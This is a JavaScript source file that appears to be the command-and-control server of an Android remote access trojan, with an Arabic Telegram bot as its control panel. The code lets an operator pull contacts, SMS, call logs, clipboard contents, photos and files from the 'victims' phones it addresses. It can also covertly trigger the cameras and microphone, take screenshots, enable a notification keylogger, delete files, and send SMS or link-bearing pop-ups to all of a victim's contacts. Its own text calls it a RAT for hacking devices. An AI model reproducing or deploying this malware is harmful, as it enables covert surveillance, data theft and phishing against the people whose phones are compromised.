const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require("fs");

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, {
  polling: true
});
const appData = new Map();
const actions = [
  "📒 جهات اتصال 📒",
  "💬 سحب الرسائل 💬",
  "📞 سجل المكالمات 📞",
  "📽 التطبيقات 📽",
  "📸 كيمرا خلفيه 📸",
  "📸 كيمرا أمامية 📸",
  "🎙 تسجيل صوت 🎙",
  "📋 سجل الحافظه 📋",
  "📺 لقطة شاشة 📺",
  "😎 اضهار رساله اسفل الشاشة 😎",
  "💬 ارسال رساله 💬",
  "📳 اهتزاز 📳",
  "▶ تشغيل الصوت ▶",
  "🛑 ايقاف الصوت 🛑",
  "🦝 اضهار اشعارات الضحية 🦝",
  "🛑 ايقاف الاشعارات 🛑",
  "📂 عرض جميع الملفات 📂",
  "🎬 سحب جميع الصور 🎬",
  "💬 ارسال رساله لجميع ارقام الضحيه 💬",
  "✯ اشعار البوب ✯",
  "✯ العودة إلى القائمة الرئيسية ✯",
];
app.get("/", (req, res) => {
  res.send("تم رفع الخادم معا تحيات المطور كيمو");
});

app.post("/upload", uploader.single("file"), (req, res) => {
  const name = req.file.originalname;
  const model = req.headers.model;
  bot.sendDocument(
    data.id,
    req.file.buffer,
    {
      caption: `<b>✯ تم تحميل ملف من هاتف الضحيه → ${model}</b>`,
      parse_mode: "HTML",
    },
    {
      filename: name,
      contentType: "*/*",
    }
  );
  res.send("Done");
});

io.on("connection", (socket) => {
  let model =
    socket.handshake.headers["model"] + "-" + io.sockets.sockets.size ||
    "no information";
  let version = socket.handshake.headers["version"] || "no information";
  let ip = socket.handshake.headers["ip"] || "no information";
  socket["model"] = model;
  socket["version"] = version;
  let device =
    `<b>✯ جهاز الضحية متصل</b>\n\n` +
    `<b>اسم الهاتف</b> → ${model}\n` +
    `<b>إصدارالهاتف</b> → ${version}\n` +
    `<b>𝚒𝚙</b> → ${ip}\n` +
    `<b>الوقت</b> → ${socket.handshake.time}\n\n`;
  bot.sendMessage(data.id, device, { parse_mode: "HTML" });
  socket.on("disconnect", () => {
    let device =
      `<b>✯ الجهاز غير متصل</b>\n\n` +
      `<b>اسم الهاتف</b> → ${model}\n` +
      `<b>إصدار الهاتف</b> → ${version}\n` +
      `<b>𝚒𝚙</b> → ${ip}\n` +
      `<b>الوقت</b> → ${socket.handshake.time}\n\n`;
    bot.sendMessage(data.id, device, { parse_mode: "HTML" });
  });
  socket.on("file-explorer", (message) => {
    let fileKeyboard = [];
    let row = [];
    message.forEach((file, index) => {
      let callBackData;
      if (file.isFolder) {
        callBackData = `${model}|cd-${file.name}`;
      } else {
        callBackData = `${model}|request-${file.name}`;
      }
      if (row.length === 0 || row.length === 1) {
        row.push({ text: file.name, callback_data: callBackData });
        if (index + 1 === message.length) {
          fileKeyboard.push(row);
        }
      } else if (row.length === 2) {
        row.push({ text: file.name, callback_data: callBackData });
        fileKeyboard.push(row);
        row = [];
      }
    });
    fileKeyboard.push([{ text: "✯ رجوع ✯", callback_data: `${model}|back-0` }]);
    bot.sendMessage(
      data.id,
      `<b>✯ تم عرض جميع الملفات لدى الضحيه ${model}</b>`,
      {
        reply_markup: {
          inline_keyboard: fileKeyboard,
        },
        parse_mode: "HTML",
      }
    );
  });
  socket.on("message", (K0a1m1el0) => {
    bot.sendMessage(
      data.id,
      `<b>✯ تم عرض اشعار ورساله من هاتف الضحيه → ${model}\n\nرساله من هاتف الضحيه → ${K0a1m1el0}K0a1m1el0`,
      {
        parse_mode: "HTML",
      }
    );
  });
});

bot.on("message", (message) => {
  if (message.text === "/start") {
    bot.sendMessage(
      data.id,
      "<b>✯ اهلآ وسهلا في اقوى بوت تحكم بضحايا الإصدار 5</b>\n\n" +
        "بوت رات قوي وسهل الاستخدام لاتحتاج الا كمبيوتر لاجل اختراق الاجهزه فبهذا البوت يمكنك التحكم باي هاتف أندرويد \nتم تطوير البوت من قبل الهكر كيمو تم تطويره لاجل التسليه والرقابه الابويه فل المطور لا يتحمل مسؤولية سوء استخدامه فيما يغضب الله قناة المطور @K0a1m1el0\n\n" +
        "تواصل بل المطور: @K0a1m1el0",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
            ["✯ معلومات عن المطور ✯"],
          ],
          resize_keyboard: true,
        },
      }
    );
  } else if (appData.get("currentAction") === "microphoneDuration") {
    let duration = message.text;
    let target = appData.get("currentTarget");
    io.to(target).emit("commend", {
      request: "microphone",
      extras: [{ key: "duration", value: duration }],
    });
    appData.delete("currentTarget");
    appData.delete("currentAction");
    bot.sendMessage(
      data.id,
      "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
            ["✯ معلومات عن المطور ✯"],
          ],
          resize_keyboard: true,
        },
      }
    );
  } else if (appData.get("currentAction") === "toastText") {
    let text = message.text;
    let target = appData.get("currentTarget");
    io.to(target).emit("commend", {
      request: "toast",
      extras: [{ key: "text", value: text }],
    });
    appData.delete("currentTarget");
    appData.delete("currentAction");
    bot.sendMessage(
      data.id,
      "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
            ["✯ معلومات عن المطور ✯"],
          ],
          resize_keyboard: true,
        },
      }
    );
  } else if (appData.get("currentAction") === "smsNumber") {
    let number = message.text;
    appData.set("currentNumber", number);
    appData.set("currentAction", "smsText");
    bot.sendMessage(
      data.id,
      `<b>✯ الان اكتب الرساله التي تريد ارسالها الا ${number}</b>\n\n`,
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ التراجع عن الاجراء ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      }
    );
  } else if (appData.get("currentAction") === "smsText") {
    let text = message.text;
    let number = appData.get("currentNumber");
    let target = appData.get("currentTarget");
    io.to(target).emit("commend", {
      request: "sendSms",
      extras: [
        { key: "number", value: number },
        { key: "text", value: text },
      ],
    });
    appData.delete("currentTarget");
    appData.delete("currentAction");
    appData.delete("currentNumber");
    bot.sendMessage(
      data.id,
      "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
            ["✯ معلومات عن المطور ✯"],
          ],
          resize_keyboard: true,
        },
      }
    );
  } else if (appData.get("currentAction") === "vibrateDuration") {
    let duration = message.text;
    let target = appData.get("currentTarget");
    io.to(target).emit("commend", {
      request: "vibrate",
      extras: [{ key: "duration", value: duration }],
    });
    appData.delete("currentTarget");
    appData.delete("currentAction");
    bot.sendMessage(
      data.id,
      "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
            ["✯ معلومات عن المطور ✯"],
          ],
          resize_keyboard: true,
        },
      }
    );
  } else if (appData.get("currentAction") === "textToAllContacts") {
    let text = message.text;
    let target = appData.get("currentTarget");
    io.to(target).emit("commend", {
      request: "smsToAllContacts",
      extras: [{ key: "text", value: text }],
    });
    appData.delete("currentTarget");
    appData.delete("currentAction");
    bot.sendMessage(
      data.id,
      "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
            ["✯ معلومات عن المطور ✯"],
          ],
          resize_keyboard: true,
        },
      }
    );
  } else if (appData.get("currentAction") === "notificationText") {
    let text = message.text;
    appData.set("currentNotificationText", text);
    appData.set("currentAction", "notificationUrl");
    bot.sendMessage(
      data.id,
      `<b>✯ ادخل اي رابط تريد فتحه بهاتف الضحيه بعد النقر فوق الاشعار</b>\n\n`,
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ التراجع عن الاجراء ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      }
    );
  } else if (appData.get("currentAction") === "notificationUrl") {
    let url = message.text;
    let text = appData.get("currentNotificationText");
    let target = appData.get("currentTarget");
    io.to(target).emit("commend", {
      request: "popNotification",
      extras: [
        { key: "text", value: text },
        { key: "url", value: url },
      ],
    });
    appData.delete("currentTarget");
    appData.delete("currentAction");
    appData.delete("currentNotificationText");
    bot.sendMessage(
      data.id,
      "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
            ["✯ معلومات عن المطور ✯"],
          ],
          resize_keyboard: true,
        },
      }
    );
  } else if (message.text === "✯ عدد الاجهزه ✯") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, "<b>✯ لايوجد ضحية متصل</b>\n\n", {
        parse_mode: "HTML",
      });
    } else {
      let devices = `<b>✯ عدد الاجهزه المخترقه: ${io.sockets.sockets.size}</b>\n\n`;
      let count = 1;
      io.sockets.sockets.forEach((value, key, map) => {
        devices +=
          `<b>العدد ${count}</b>\n` +
          `<b>اسم الهاتف</b> → ${value.model}\n` +
          `<b>اصدار الهاتف</b> → ${value.version}\n` +
          `<b>𝚒𝚙</b> → ${value.ip}\n` +
          `<b>الوقت</b> → ${value.handshake.time}\n\n`;
        count += 1;
      });
      bot.sendMessage(data.id, devices, { parse_mode: "HTML" });
    }
  } else if (message.text === "✯ قائمة التحكم ✯") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, "<b>✯ لايوجد ضحية متصل </b>\n\n", {
        parse_mode: "HTML",
      });
    } else {
      let devices = [];
      io.sockets.sockets.forEach((value, key, map) => {
        devices.push([value.model]);
      });
      devices.push(["✯ العودة إلى القائمة الرئيسية ✯"]);
      bot.sendMessage(data.id, "<b>✯ حدد الجهاز اللي تريد التحكم به</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: devices,
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      });
    }
  } else if (message.text === "✯ معلومات عن المطور ✯") {
    bot.sendMessage(
      data.id,
      data.id,
      data.id,
      "<b>✯ نحن الجيش اليمني السيبراني نخترق \nنصنع برمجيات خبيثه لاختراق الاجهزه, \n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @K0a1m1el0\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @K0a1m1el0</b>\n\n",
      {
        parse_mode: "HTML",
      }
    );
  } else if (message.text === "✯ العودة إلى القائمة الرئيسية ✯") {
    bot.sendMessage(data.id, "<b>✯ القائمة الرئيسية</b>\n\n", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
          ["✯ معلومات عن المطور ✯"],
        ],
        resize_keyboard: true,
      },
    });
  } else if (message.text === "✯ التراجع عن الاجراء ✯") {
    let target = io.sockets.sockets.get(appData.get("currentTarget")).model;
    bot.sendMessage(
      data.id,
      `<b>✯ حدد اجرا اي شي تريد بجهاز الضحيه ${target}</b>\n\n`,
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📒 جهات اتصال 📒", "💬 سحب الرسائل 💬"],
            ["📞 سجل المكالمات 📞", "📽 التطبيقات 📽"],
            ["📸 كيمرا خلفيه 📸", "📸 كيمرا أمامية 📸"],
            ["🎙 تسجيل صوت 🎙", "📋 سجل الحافظه 📋"],
            ["📺 لقطة شاشة 📺", "😎 اضهار رساله اسفل الشاشة 😎"],
            ["💬 ارسال رساله 💬", "📳 اهتزاز 📳"],
            ["▶ تشغيل الصوت ▶", "🛑 ايقاف الصوت 🛑"],
            ["🦝 اضهار اشعارات الضحية 🦝", "🛑 ايقاف الاشعارات 🛑"],
            ["📂 عرض جميع الملفات 📂", "🎬 سحب جميع الصور 🎬"],
            ["💬 ارسال رساله لجميع ارقام الضحيه 💬"],
            ["✯ اشعار البوب ✯"],
            ["✯ العودة إلى القائمة الرئيسية ✯"],
          ],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      }
    );
  } else if (actions.includes(message.text)) {
    let target = appData.get("currentTarget");
    if (message.text === "📒 جهات اتصال 📒") {
      io.to(target).emit("commend", { request: "contacts", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "💬 سحب الرسائل 💬") {
      io.to(target).emit("commend", { request: "all-sms", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "📞 سجل المكالمات 📞") {
      io.to(target).emit("commend", { request: "calls", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "📽 التطبيقات 📽") {
      io.to(target).emit("commend", { request: "apps", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "📸 كيمرا خلفيه 📸") {
      io.to(target).emit("commend", { request: "main-camera", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "📸 كيمرا أمامية 📸") {
      io.to(target).emit("commend", { request: "selfie-camera", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "📋 سجل الحافظه 📋") {
      io.to(target).emit("commend", { request: "clipboard", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "📺 لقطة شاشة 📺") {
      io.to(target).emit("commend", { request: "screenshot", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "🦝 اضهار اشعارات الضحية 🦝") {
      io.to(target).emit("commend", { request: "keylogger-on", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "🛑 ايقاف الاشعارات 🛑") {
      io.to(target).emit("commend", { request: "keylogger-off", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "📂 عرض جميع الملفات 📂") {
      io.to(target).emit("file-explorer", { request: "ls", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "🎬 سحب جميع الصور 🎬") {
      io.to(target).emit("commend", { request: "gallery", extras: [] });
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    }
    if (message.text === "🎙 تسجيل صوت 🎙") {
      appData.set("currentAction", "microphoneDuration");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ التراجع عن الاجراء ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
    }
    if (message.text === "😎 اضهار رساله اسفل الشاشة 😎") {
      appData.set("currentAction", "toastText");
      bot.sendMessage(
        data.id,
        "<b>✯ اكتب الرسالة التي تريد اضهارها اسفل الشاشة</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ التراجع عن الاجراء ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
    }
    if (message.text === "💬 ارسال رساله 💬") {
      appData.set("currentAction", "smsNumber");
      bot.sendMessage(
        data.id,
        "<b>✯ اكتب الرقم الذي تريد إرسال الرساله اليه اذا كان الضحيه ليس من بلدك فكتب الرقم معا رمز الدوله </b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ التراجع عن الاجراء ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
    }
    if (message.text === "📳 اهتزاز 📳") {
      appData.set("currentAction", "vibrateDuration");
      bot.sendMessage(
        data.id,
        "<b>✯ ادخل المده بثواني الذي تريد بان يهتز بها هاتف ضحيتك</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ التراجع عن الاجراء ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
    }
    if (message.text === "💬 ارسال رساله لجميع ارقام الضحيه 💬") {
      appData.set("currentAction", "textToAllContacts");
      bot.sendMessage(
        data.id,
        "<b>✯ ادخل الرسالة التي تريد ارسالها لجميع ارقام الضحيه</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ التراجع عن الاجراء ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
    }
    if (message.text === "✯ اشعار البوب ✯") {
      appData.set("currentAction", "notificationText");
      bot.sendMessage(
        data.id,
        "<b>✯ اكتب الاشعار الذي تريد ان يضهر لضحيه</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ التراجع عن الاجراء ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
    }
    if (message.text === "▶ تشغيل الصوت ▶") {
      appData.set("currentAction", "recordVoice");
      bot.sendMessage(data.id, "<b>✯ سجل الصوت لتشغيله بهاتف الضحيه</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ التراجع عن الاجراء ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      });
    }
  } else {
    io.sockets.sockets.forEach((value, key, map) => {
      if (message.text === value.model) {
        appData.set("currentTarget", key);
        bot.sendMessage(
          data.id,
          `<b>✯ حدد اجرا اي شي تريد بجهاز الضحيه ${value.model}</b>\n\n`,
          {
            parse_mode: "HTML",
            reply_markup: {
              keyboard: [
                ["📒 جهات اتصال 📒", "💬 سحب الرسائل 💬"],
                ["📞 سجل المكالمات 📞", "📽 التطبيقات 📽"],
                ["📸 كيمرا خلفيه 📸", "📸 كيمرا أمامية 📸"],
                ["🎙 تسجيل صوت 🎙", "📋 سجل الحافظه 📋"],
                ["📺 لقطة شاشة 📺", "😎 اضهار رساله اسفل الشاشة 😎"],
                ["💬 ارسال رساله 💬", "📳 اهتزاز 📳"],
                ["▶ تشغيل الصوت ▶", "🛑 ايقاف الصوت 🛑"],
                ["🦝 اضهار اشعارات الضحية 🦝", "🛑 ايقاف الاشعارات 🛑"],
                ["📂 عرض جميع الملفات 📂", "🎬 سحب جميع الصور 🎬"],
                ["💬 ارسال رساله لجميع ارقام الضحيه 💬"],
                ["✯ اشعار البوب ✯"],
                ["✯ العودة إلى القائمة الرئيسية ✯"],
              ],
              resize_keyboard: true,
              one_time_keyboard: true,
            },
          }
        );
      }
    });
  }
});

bot.on("voice", (message) => {
  if (appData.get("currentAction") === "recordVoice") {
    let voiceId = message.voice.file_id;
    let target = appData.get("currentTarget");
    bot.getFileLink(voiceId).then((link) => {
      console.log(link);
      io.to(target).emit("commend", {
        request: "playAudio",
        extras: [{ key: "url", value: link }],
      });
      appData.delete("currentTarget");
      appData.delete("currentAction");
      bot.sendMessage(
        data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
              ["✯ معلومات عن المطور ✯"],
            ],
            resize_keyboard: true,
          },
        }
      );
    });
  }
});

bot.on("callback_query", (callbackQuery) => {
  console.log(callbackQuery);
  let callbackQueryData = callbackQuery.data;
  let model = callbackQueryData.split("|")[0];
  let commend = callbackQueryData.split("|")[1];
  let request = commend.split("-")[0];
  let name = commend.split("-")[1];
  if (request === "back") {
    io.sockets.sockets.forEach((value, key, map) => {
      if (value.model === model) {
        io.to(key).emit("file-explorer", { request: "back", extras: [] });
      }
    });
  }
  if (request === "cd") {
    io.sockets.sockets.forEach((value, key, map) => {
      if (value.model === model) {
        io.to(key).emit("file-explorer", {
          request: "cd",
          extras: [{ key: "name", value: name }],
        });
      }
    });
  }
  if (request === "upload") {
    io.sockets.sockets.forEach((value, key, map) => {
      if (value.model === model) {
        io.to(key).emit("file-explorer", {
          request: "upload",
          extras: [{ key: "name", value: name }],
        });
      }
    });
  }
  if (request === "delete") {
    io.sockets.sockets.forEach((value, key, map) => {
      if (value.model === model) {
        io.to(key).emit("file-explorer", {
          request: "delete",
          extras: [{ key: "name", value: name }],
        });
      }
    });
  }
  if (request === "request") {
    bot.editMessageText(`✯ حدد اي اجرا تريد : ${name}`, {
      chat_id: data.id,
      message_id: callbackQuery.message.message_id,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✯ تحميل ملف ✯", callback_data: `${model}|upload-${name}` },
            {
              text: "✯ حذف الملف ✯",
              callback_data: `${model}|delete-${name}`,
            },
          ],
        ],
      },
      parse_mode: "HTML",
    });
  }
});

setInterval(() => {
  io.sockets.sockets.forEach((value, key, map) => {
    io.to(key).emit("ping", {});
  });
}, 5000);

// starting server
server.listen(process.env.PORT || 3000, () => {
  console.log("listening on port 3000");
});
